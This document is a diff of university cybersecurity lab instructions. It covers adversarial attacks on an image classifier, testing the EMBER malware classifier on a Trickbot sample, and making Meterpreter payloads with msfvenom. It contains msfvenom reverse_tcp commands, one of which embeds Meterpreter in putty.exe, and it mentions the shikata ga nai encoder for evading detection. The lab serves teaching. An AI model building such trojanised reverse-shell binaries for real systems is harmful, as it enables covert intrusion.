@@ -26,6 +26,10 @@ To see how this works, we can use a program that uses what is called a non-targe
 
 Start the docker container as follows:
 
+{% hint style="warning" %}
+make sure you have created the share folder in your host machine first. You can also share to existing folder by providing the path.
+{% endhint %}
+
 {% tabs %}
 {% tab title="Windows" %}
 ```bash
@@ -54,8 +58,11 @@ Once on the docker container, go to the directory `/opt/adversarial/share`. From
 
 To run the script we do so as follows:
 
+```
+python exploit.py lab_og.jpg
+```
+
 ```bash
-root@e53ca40f207d:/opt/adversarial/share# python exploit.py lab_og.jpg
 2022-02-23 08:23:47.274847: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
 2022-02-23 08:23:47.274891: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
 2022-02-23 08:23:48.411448: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
@@ -139,15 +146,18 @@ To test the model `cd` on the same docker container to the directory `/opt/ember
 
 To test the malware, we can use the following command:
 
+```
+python scripts/classify_binaries.py -m ember_model_2018.txt malware
+```
+
 ```bash
-root@863da6f82693:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt malware
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
-0.99....
+0.99....[hidden]....
 ```
 
-The script `classify_binary.py` takes the trained model as an argument and the binary file to analyse. As you can see, the sample `malware` is given a 99% probability of being malware.
+The script `classify_binary.py` takes the trained model as an argument and the binary file to analyse. As you can see, the sample `malware` is given a >99% probability of being malware.
 
 {% hint style="danger" %}
 This \*is\* real malware - do not download to your PC or try and execute
@@ -157,8 +167,11 @@ The malware is actually _Trickbot_, which is a banking trojan.
 
 We can now try with a normal Windows program `git.exe`
 
+```
+python scripts/classify_binaries.py -m ember_model_2018.txt git.exe
+```
+
 ```bash
-root@863da6f82693:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt git.exe
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
@@ -195,25 +208,9 @@ This will create a local volume named `volume1`, you can check by `docker volume
 
 Let's run a Docker container as follows:
 
-{% tabs %}
-{% tab title="Windows" %}
-```bash
+```
 docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:metasploit
 ```
-{% endtab %}
-
-{% tab title="Linux" %}
-```
-docker run -v /projects/share:/opt/share -it --rm uwacyber/cits1003-labs:metasploit
-```
-{% endtab %}
-
-{% tab title="Apple Silicon" %}
-```
-docker run -v $(pwd)/share:/opt/share -it --rm uwacyber/cits1003-labs:metasploit
-```
-{% endtab %}
-{% endtabs %}
 
 this will create a folder called `volume1` in the root directory (you can name this something else e.g., `volume1:/extra`), which is attached to the local volume `volume1`.
 
@@ -223,7 +220,7 @@ Then, we are going to need a file called `putty.exe` that we are going to use as
 https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
 ```
 
-Alternatively (e.g., using the shared local volume approach), you can use `wget` to download directly from docker (and move it into the shared folder). You would need to `apt-get update` and `apt-get install wget` on the container. I have saved this file in the `/opt` folder.
+Alternatively (e.g., using the shared local volume approach), you can use `wget` to download directly from docker (and move it into the shared folder). You would need to `apt-get update` and `apt-get install wget` on the container.&#x20;
 
 Now, we can run Metasploit by typing:
 
@@ -297,11 +294,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
 
 You don't really have to worry about the parameters but if you are interested, the `LHOST` and `LPORT` arguments tell Meterpreter where to connect back to (i.e. our machine). We haven't set up a listener on port 4443 and our executable actually doesn't send back anything, so these values are just there as a space holder. The `-f exe` tells Meterpreter that we are using an executable format for the payload.
 
-Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable `putty.exe`. Putty is an application that allows SSH connections on a Windows box. I have saved `putty.exe` in the `/opt` directory. Run the `msfvenom` command as follows:
+Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable `putty.exe`. Putty is an application that allows SSH connections on a Windows box. I have saved `putty.exe` in the `/volume1` (shared) directory. Run the `msfvenom` command as follows:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
--f exe -x /opt/putty.exe > /volume1/meterpreter2.exe
+-f exe -x /volume1/putty.exe > /volume1/meterpreter2.exe
 ```
 
 Moreover, `Msfvenom` has other encoders that try and obfuscate the file to avoid detection. One of these is called `shikata ga nai`. You can create a meterpreter binary using the flag:
